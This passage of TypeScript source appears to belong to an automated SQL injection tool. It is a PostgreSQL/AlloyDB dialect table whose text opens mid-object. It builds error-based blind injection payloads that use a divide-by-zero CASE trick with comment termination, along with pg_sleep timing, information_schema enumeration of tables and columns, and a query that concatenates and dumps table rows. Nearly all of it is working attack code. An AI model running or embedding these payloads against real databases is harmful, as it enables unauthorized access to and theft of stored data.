      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS text), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: "SELECT version() || ' (AlloyDB Engine)'",
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS text),'')`).join("||':::'||");
        return `SELECT STRING_AGG(${concatExpr}, E'\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
    });
  }

  public static get(dbms: DbmsType = 'Generic SQL'): DialectCapabilities {
    return this.capabilities.get(dbms) || this.capabilities.get('Generic SQL')!;
  }

  public static getAllSupportedDbms(): DbmsType[] {
    return Array.from(this.capabilities.keys());
  }
}

